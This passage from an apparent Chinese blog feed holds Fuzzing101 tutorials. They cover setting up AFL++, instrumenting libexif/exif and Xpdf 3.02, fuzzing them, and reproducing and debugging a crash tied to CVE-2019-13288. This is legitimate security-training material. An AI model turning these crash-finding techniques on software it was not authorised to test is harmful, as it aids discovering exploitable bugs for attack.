libexif-libexif-0_6_15-release&#x2F;</span><br><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi</span><br><span class="line">.&#x2F;configure --enable-shared&#x3D;no --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;&quot;</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="选择接口应用程序"><a href="#选择接口应用程序" class="headerlink" title="选择接口应用程序"></a>选择接口应用程序</h3><p>由于 libexif 是一个库，所以还需要一个调用 libexif 库的程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 下载</span><br><span class="line">cd $HOME&#x2F;fuzzing_libexif</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;libexif&#x2F;exif&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;exif-0_6_15-release.tar.gz</span><br><span class="line">tar -xzvf exif-0_6_15-release.tar.gz</span><br><span class="line"></span><br><span class="line"># 构建并安装</span><br><span class="line">cd exif-exif-0_6_15-release&#x2F;</span><br><span class="line">autoreconf -fvi</span><br><span class="line">.&#x2F;configure --enable-shared&#x3D;no --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;&quot; PKG_CONFIG_PATH&#x3D;$HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;lib&#x2F;pkgconfig</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>键入指令查看是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;bin&#x2F;exif</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646284932632802/f09bba6ff773fd79bf6e6f86ba38bdd8bca7c1f9.png" alt="image-20220303132212339"></p><h3 id="种子语料库创建"><a href="#种子语料库创建" class="headerlink" title="种子语料库创建"></a>种子语料库创建</h3><p>因为程序本身的功能就是解析 exif 文件，所以要选取一些 exif 文件作为种子，项目中已经给出了链接地址，只需要下载即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME&#x2F;fuzzing_libexif</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;ianare&#x2F;exif-samples&#x2F;archive&#x2F;refs&#x2F;heads&#x2F;master.zip</span><br><span class="line">unzip master.zip</span><br></pre></td></tr></table></figure><p>键入指令查看是否成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;bin&#x2F;exif $HOME&#x2F;fuzzing_libexif&#x2F;exif-samples-master&#x2F;jpg&#x2F;Canon_40D_photoshop_import.jpg</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646285227463824/a40ce9459e48b4e5254b00cb3700cfd49dfa49ab.png" alt="image-20220303132707277"></p><h3 id="Afl-clang-lto-仪表"><a href="#Afl-clang-lto-仪表" class="headerlink" title="Afl-clang-lto 仪表"></a>Afl-clang-lto 仪表</h3><p>使用 <code>afl-clang-lto</code> 重新对 libexif 和 exif 进行编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME&#x2F;fuzzing_libexif&#x2F;install</span><br><span class="line">cd $HOME&#x2F;fuzzing_libexif&#x2F;libexif-libexif-0_6_14-release&#x2F;</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG&#x3D;&quot;llvm-config-11&quot;</span><br><span class="line">CC&#x3D;afl-clang-lto .&#x2F;configure --enable-shared&#x3D;no --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME&#x2F;fuzzing_libexif&#x2F;exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG&#x3D;&quot;llvm-config-11&quot;</span><br><span class="line">CC&#x3D;afl-clang-lto .&#x2F;configure --enable-shared&#x3D;no --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;&quot; PKG_CONFIG_PATH&#x3D;$HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;lib&#x2F;pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME&#x2F;fuzzing_libexif&#x2F;exif-samples-master&#x2F;jpg&#x2F; -o $HOME&#x2F;fuzzing_libexif&#x2F;out&#x2F; -s 123 -- $HOME&#x2F;fuzzing_libexif&#x2F;install&#x2F;bin&#x2F;exif @@</span><br></pre></td></tr></table></figure><p>界面</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646285862325900/ad0bfdf2148b0372b06cf87804bc0a58559bfa01.png" alt="image-20220303133742115"></p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>exe1 使用的是 gdb 调试，这一次要用 Eclipse IDE 调试</p><p>首先要先安装 Eclipse IDE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 安装Java环境</span><br><span class="line">sudo apt install default-jdk</span><br><span class="line"></span><br><span class="line"># download and run Eclipse</span><br><span class="line">cd %HOME&#x2F;fuzzing_libexif</span><br><span class="line">wget https:&#x2F;&#x2F;download.eclipse.org&#x2F;technology&#x2F;epp&#x2F;downloads&#x2F;release&#x2F;2021-06&#x2F;R&#x2F;eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz</span><br><span class="line">tar -zxvf eclipse-cpp-2021-06-R-linux-gtk-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>解压完成后，直接运行 eclipse 即可</p><p>运行后会有一个界面，直接点 launch 即可</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646286682276512/d3d1d3cae84e00e17fc6129cddb0faecffb8bd68.png" alt="image-20220303135122078"></p><p>在菜单栏中找到 File-&gt;Import，会出现以下界面，选择好 “Existing code as makefile project” 后 next</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646286827030809/37453803842f023164fe56cfe8ffdf226a2deab1.png" alt="image-20220303135346875"></p><p>继续设置</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646287053442910/485af55f9cbb735f696ff6caf4c98cda8d52e239.png" alt="image-20220303135733252"></p><p>如果一切顺利，应该能够在项目资源管理器选项卡中看到 “exif” 文件夹。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646287109959575/db45e6c3f9148fba60048731a05cefd37b5e1c65.png" alt="image-20220303135829759"></p><p>接着是配置调试参数，需要去<code>Run -&gt; Debug Configurations</code>进行设置。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646287249335519/d5f2a06a69f38cd3d4eac085c6bdecfc68405d51.png" alt="image-20220303140049035"></p><p>Argument 中设置好报错文件位置</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646287320586767/46693a5ec21611978c297de1a9c84d1be3c37a9a.png" alt="image-20220303140200374"></p><p>设置完成后就可以直接 Debug 了，程序会在主函数的开始处停止</p><p>再<code>Run -&gt; resume</code>就可以直接追溯到报错的地方</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe2/1646287404790016/f0e8b3b4444c366bd4f9b39bb27e352bd0e0ce19.png" alt="image-20220303140324572"></p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101-exe1</title>
      <link href="/2022/02/19/Fuzzing101-exe1/"/>
      <url>/2022/02/19/Fuzzing101-exe1/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文是 Fuzzing101 训练的第一篇，目标是找到 Xpdf 3.02 版本不受控制的递归函数漏洞，而每次调用函数都会在栈上开辟新的栈帧，如果一个函数反复调用很多次，会导致<strong>栈内存耗尽从而程序崩溃</strong>。<a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>项目网址： <a href="https://github.com/antonio-morales/Fuzzing101">https://github.com/antonio-morales/Fuzzing101</a> </p><h2 id="将会学到的知识"><a href="#将会学到的知识" class="headerlink" title="将会学到的知识"></a>将会学到的知识</h2><ul><li>对程序进行插桩</li><li>AFL-FUZZ 的使用</li><li>GDB 调试程序</li></ul><h2 id="环境与搭建"><a href="#环境与搭建" class="headerlink" title="环境与搭建"></a>环境与搭建</h2><p>Ubuntu 20(推荐使用)</p><h3 id="安装-Xpdf"><a href="#安装-Xpdf" class="headerlink" title="安装 Xpdf"></a>安装 Xpdf</h3><p>首先需要下载一些额外工具(即 make 和 gcc)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install build-essential</span><br></pre></td></tr></table></figure><p>为此项目创建一个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd $HOME</span><br><span class="line">$ mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf&#x2F;</span><br></pre></td></tr></table></figure><p>下载 Xpdf 3.02：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;dl.xpdfreader.com&#x2F;old&#x2F;xpdf-3.02.tar.gz</span><br><span class="line">$ tar -xvzf xpdf-3.02.tar.gz</span><br></pre></td></tr></table></figure><p>构建 Xpdf：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd xpdf-3.02</span><br><span class="line">$ sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line">$ .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;&quot;</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p>下载一些 PDF 示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd $HOME&#x2F;fuzzing_xpdf</span><br><span class="line">$ mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;mozilla&#x2F;pdf.js-sample-files&#x2F;raw&#x2F;master&#x2F;helloworld.pdf #注意</span><br><span class="line">$ wget http:&#x2F;&#x2F;www.africau.edu&#x2F;images&#x2F;default&#x2F;sample.pdf</span><br><span class="line">$ wget https:&#x2F;&#x2F;www.melbpc.org.au&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;10&#x2F;small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure><p>要注意的是，其中的 <code>helloworld.pdf</code>链接对于 wget 已经失效，但是直接在浏览器上下载还是可以的，所以可以在本机下好后再拖入虚拟机。</p><p>现在，可以使用以下命令测试 pdfinfo 二进制文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ $HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;bin&#x2F;pdfinfo -box -meta $HOME&#x2F;fuzzing_xpdf&#x2F;pdf_examples&#x2F;helloworld.pdf</span><br></pre></td></tr></table></figure><p>将会看到如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gyx@ubuntu:~&#x2F;fuzzing_xpdf$ $HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;bin&#x2F;pdfinfo -box -meta $HOME&#x2F;fuzzing_xpdf&#x2F;pdf_examples&#x2F;helloworld.pdf</span><br><span class="line">Tagged:         no</span><br><span class="line">Pages:          1</span><br><span class="line">Encrypted:      no</span><br><span class="line">Page size:      200 x 200 pts</span><br><span class="line">MediaBox:           0.00     0.00   200.00   200.00</span><br><span class="line">CropBox:            0.00     0.00   200.00   200.00</span><br><span class="line">BleedBox:           0.00     0.00   200.00   200.00</span><br><span class="line">TrimBox:            0.00     0.00   200.00   200.00</span><br><span class="line">ArtBox:             0.00     0.00   200.00   200.00</span><br><span class="line">File size:      678 bytes</span><br><span class="line">Optimized:      no</span><br><span class="line">PDF version:    1.7</span><br></pre></td></tr></table></figure><h3 id="安装-AFL"><a href="#安装-AFL" class="headerlink" title="安装 AFL++"></a>安装 AFL++</h3><p>将会用到 AFL++ 的最新版</p><p>安装依赖项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line">$ sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">$ sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#39;s&#x2F;.* &#x2F;&#x2F;&#39;|sed &#39;s&#x2F;\..*&#x2F;&#x2F;&#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#39;s&#x2F;.* &#x2F;&#x2F;&#39;|sed &#39;s&#x2F;\..*&#x2F;&#x2F;&#39;)-dev</span><br></pre></td></tr></table></figure><p>构建 AFL++</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd $HOME</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;AFLplusplus&#x2F;AFLplusplus &amp;&amp; cd AFLplusplus</span><br><span class="line">$ export LLVM_CONFIG&#x3D;&quot;llvm-config-11&quot;</span><br><span class="line">$ make distrib</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>需要注意的是，国内下载 github 相对较慢，所以可以通过<code>git clone git://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus</code>更快速的下载。<code>make distrib</code>这一项，安装过程中可能会出现 qemu_mode、frida 和 unicorn 安装失败，或者 unicorn mode 未工作的情况。这里列举一下每一项的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">all：只是主要的 AFL++ 二进制文件</span><br><span class="line">binary-only：仅二进制模糊测试的所有内容：qemu_mode、unicorn_mode、libdislocator、libtokencap、radamsa</span><br><span class="line">source-only：源代码模糊测试的所有内容：llvm_mode、libdislocator、libtokencap、radamsa</span><br><span class="line">distrib：一切（仅用于二进制和源代码模糊测试）</span><br><span class="line">install：安装您使用上面的构建选项编译的所有内容</span><br><span class="line">clean：清洁一切。对于 qemu_mode 和 unicorn_mode 这意味着它也会删除所有下载</span><br><span class="line">code-format：格式化代码，请在提交之前执行此操作并发送 PR！</span><br><span class="line">tests：运行测试用例以确保所有功能仍然正常工作</span><br><span class="line">help: 显示这些构建选项</span><br></pre></td></tr></table></figure><p>llvm_mode 等功能现在暂时还用不上，所以也可以换成 <code>make all</code>指令</p><p>键入<code>afl-fuzz</code>即可查看是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gyx@ubuntu:~&#x2F;fuzzing_xpdf$ afl-fuzz</span><br><span class="line">afl-fuzz++4.01a based on afl by Michal Zalewski and a large online community</span><br><span class="line"></span><br><span class="line">afl-fuzz [ options ] -- &#x2F;path&#x2F;to&#x2F;fuzzed_app [ ... ]</span><br><span class="line"></span><br><span class="line">Required parameters:</span><br><span class="line">  -i dir        - input directory with test cases</span><br><span class="line">  -o dir        - output directory for fuzzer findings</span><br><span class="line"></span><br><span class="line">Execution control settings:</span><br><span class="line">  -p schedule   - power schedules compute a seed&#39;s performance score:</span><br><span class="line">                  fast(default), explore, exploit, seek, rare, mmopt, coe, lin</span><br><span class="line">                  quad -- see docs&#x2F;FAQ.md for more information</span><br><span class="line">  -f file       - location read by the fuzzed program (default: stdin or @@)</span><br><span class="line">  -t msec       - timeout for each run (auto-scaled, default 1000 ms). Add a &#39;+&#39;</span><br><span class="line">                  to auto-calculate the timeout, the value being the maximum.</span><br><span class="line">  -m megs       - memory limit for child process (0 MB, 0 &#x3D; no limit [default])</span><br><span class="line">  -O            - use binary-only instrumentation (FRIDA mode)</span><br><span class="line">  -Q            - use binary-only instrumentation (QEMU mode)</span><br><span class="line">  -U            - use unicorn-based instrumentation (Unicorn mode)</span><br><span class="line">  -W            - use qemu-based instrumentation with Wine (Wine mode)</span><br><span class="line">  -X            - use VM fuzzing (NYX mode - standalone mode)</span><br><span class="line">  -Y            - use VM fuzzing (NYX mode - multiple instances mode)</span><br><span class="line"></span><br><span class="line">Mutator settings:</span><br><span class="line">  -g minlength  - set min length of generated fuzz input (default: 1)</span><br><span class="line">  -G maxlength  - set max length of generated fuzz input (default: 1048576)</span><br><span class="line">  -D            - enable deterministic fuzzing (once per queue entry)</span><br><span class="line">  -L minutes    - use MOpt(imize) mode and set the time limit for entering the</span><br><span class="line">                  pacemaker mode (minutes of no new finds). 0 &#x3D; immediately,</span><br><span class="line">                  -1 &#x3D; immediately and together with normal mutation.</span><br><span class="line">                  See docs&#x2F;README.MOpt.md</span><br><span class="line">  -c program    - enable CmpLog by specifying a binary compiled for it.</span><br><span class="line">                  if using QEMU, just use -c 0.</span><br><span class="line">  -l cmplog_opts - CmpLog configuration values (e.g. &quot;2AT&quot;):</span><br><span class="line">                  1&#x3D;small files, 2&#x3D;larger files (default), 3&#x3D;all files,</span><br><span class="line">                  A&#x3D;arithmetic solving, T&#x3D;transformational solving.</span><br><span class="line"></span><br><span class="line">Fuzzing behavior settings:</span><br><span class="line">  -Z            - sequential queue selection instead of weighted random</span><br><span class="line">  -N            - do not unlink the fuzzing input file (for devices etc.)</span><br><span class="line">  -n            - fuzz without instrumentation (non-instrumented mode)</span><br><span class="line">  -x dict_file  - fuzzer dictionary (see README.md, specify up to 4 times)</span><br><span class="line"></span><br><span class="line">Test settings:</span><br><span class="line">  -s seed       - use a fixed seed for the RNG</span><br><span class="line">  -V seconds    - fuzz for a specified time then terminate</span><br><span class="line">  -E execs      - fuzz for an approx. no. of total executions then terminate</span><br><span class="line">                  Note: not precise and can have several more executions.</span><br><span class="line"></span><br><span class="line">Other stuff:</span><br><span class="line">  -M&#x2F;-S id      - distributed mode (see docs&#x2F;parallel_fuzzing.md)</span><br><span class="line">                  -M auto-sets -D, -Z (use -d to disable -D) and no trimming</span><br><span class="line">  -F path       - sync to a foreign fuzzer queue directory (requires -M, can</span><br><span class="line">                  be specified up to 32 times)</span><br><span class="line">  -T text       - text banner to show on the screen</span><br><span class="line">  -I command    - execute this command&#x2F;script when a new crash is found</span><br><span class="line">  -C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line">  -b cpu_id     - bind the fuzzing process to the specified CPU core (0-...)</span><br><span class="line">  -e ext        - file extension for the fuzz test input file (if needed)</span><br><span class="line"></span><br><span class="line">To view also the supported environment variables of afl-fuzz please use &quot;-hh&quot;.</span><br><span class="line"></span><br><span class="line">Compiled with Python 3.8.10 module support, see docs&#x2F;custom_mutator.md</span><br><span class="line">Compiled without AFL_PERSISTENT_RECORD support.</span><br><span class="line">Compiled with shmat support.</span><br><span class="line">For additional help please consult &#x2F;usr&#x2F;local&#x2F;share&#x2F;doc&#x2F;afl&#x2F;README.md :)</span><br></pre></td></tr></table></figure><h2 id="插桩与运行"><a href="#插桩与运行" class="headerlink" title="插桩与运行"></a>插桩与运行</h2><p>用 AFL 的编译器编译代码</p><p>首先要清理所有之前编译的目标文件和可执行文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ rm -r $HOME&#x2F;fuzzing_xpdf&#x2F;install</span><br><span class="line">$ cd $HOME&#x2F;fuzzing_xpdf&#x2F;xpdf-3.02&#x2F;</span><br><span class="line">$ make clean</span><br></pre></td></tr></table></figure><p>接着使用 afl-clang-fast 编译器构建 Xpdf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ export LLVM_CONFIG&#x3D;&quot;llvm-config-11&quot;</span><br><span class="line">$ CC&#x3D;$HOME&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;$HOME&#x2F;AFLplusplus&#x2F;afl-clang-fast++ .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;&quot;</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p>运行模糊器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i $HOME&#x2F;fuzzing_xpdf&#x2F;pdf_examples&#x2F; -o $HOME&#x2F;fuzzing_xpdf&#x2F;out&#x2F; -s 123 -- $HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;bin&#x2F;pdftotext @@ $HOME&#x2F;fuzzing_xpdf&#x2F;output</span><br></pre></td></tr></table></figure><p>每个选项简要说明：</p><ul><li><em>-i</em> 表示我们必须放置输入案例的目录（又名文件示例）</li><li><em>-o</em> 表示 AFL++ 将存储变异文件的目录</li><li><em>-s</em> 表示要使用的静态随机种子，这边建议设置一个固定种子(如 -s 123)，这样模糊测试的结果会和显示结果相似，从而更轻松的练习</li><li><em>@@</em> 是占位符目标的命令行，AFL 将用每个输入文件名替换</li></ul><p>如果在 fuzz 过程中遇到有关于 core_pattern 的报错，可以这样设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo su</span><br><span class="line">$ echo core &gt;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern</span><br><span class="line">$ exit</span><br></pre></td></tr></table></figure><p>成功后就会出现 fuzz 界面，可以看到此时有一个 crash</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe1/1645519406513814/70b99174a47b19aabcc260624c5fa775e992521f.png" alt="image-20220222164326160"></p><h2 id="重现崩溃"><a href="#重现崩溃" class="headerlink" title="重现崩溃"></a>重现崩溃</h2><p>在目录中找到崩溃对应的文件<code>$HOME/fuzzing_xpdf/out/default/crashes</code>，会发现一个文件名类似于<code>id:000000,sig:11,src:000972,time:155131,execs:90167,op:havoc,rep:8</code>的文件。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe1/1645519642625054/e989abbf9d025fb5ffa28526e539ef599f7b4ced.png" alt="image-20220222164722446"></p><p>将此文件作为输入传递给 pdftotext 二进制文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ $HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;bin&#x2F;pdftotext &#39;$HOME&#x2F;fuzzing_xpdf&#x2F;out&#x2F;default&#x2F;crashes&#x2F;&lt;your_filename&gt;&#39; $HOME&#x2F;fuzzing_xpdf&#x2F;output</span><br></pre></td></tr></table></figure><p>要注意的是，如果显示打不开文件可以输入文件的绝对路径，例如我这就改为<code>$HOME/fuzzing_xpdf/install/bin/pdftotext &#39;/home/gyx/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:000972,time:155131,execs:90167,op:havoc,rep:8&#39; /home/gyx/fuzzing_xpdf/output</code>，网上看到一个方法说可以把文件名改为 <code>xxx.pdf</code>，但是我没试成功。</p><p>成功后显示是段错误</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe1/1645519938839698/405c9b131d94efe67367c342df1b3e3eb836d7fe.png" alt="image-20220222165218670"></p><h2 id="gdb-调试"><a href="#gdb-调试" class="headerlink" title="gdb 调试"></a>gdb 调试</h2><p>用 gdb 找出程序因为这个输入而崩溃的原因</p><p>首先，使用调试信息重建 Xpdf 以获得符号堆栈跟踪</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ rm -r $HOME&#x2F;fuzzing_xpdf&#x2F;install</span><br><span class="line">$ cd $HOME&#x2F;fuzzing_xpdf&#x2F;xpdf-3.02&#x2F;</span><br><span class="line">$ make clean</span><br><span class="line">$ CFLAGS&#x3D;&quot;-g -O0&quot; CXXFLAGS&#x3D;&quot;-g -O0&quot; .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;&quot;</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p>运行 GDB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb --args $HOME&#x2F;fuzzing_xpdf&#x2F;install&#x2F;bin&#x2F;pdftotext $HOME&#x2F;fuzzing_xpdf&#x2F;out&#x2F;default&#x2F;crashes&#x2F;&lt;your_filename&gt; $HOME&#x2F;fuzzing_xpdf&#x2F;output</span><br></pre></td></tr></table></figure><p>然后在 GDB 中输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; run</span><br></pre></td></tr></table></figure><p>可以看到程序有很多报错</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe1/1645520492903765/e1c60c005f12c7373184943465b1aac0ed3e3b07.png" alt="image-20220222170132713"></p><p>然后键入<code>bt</code>以获取回溯</p><p><img 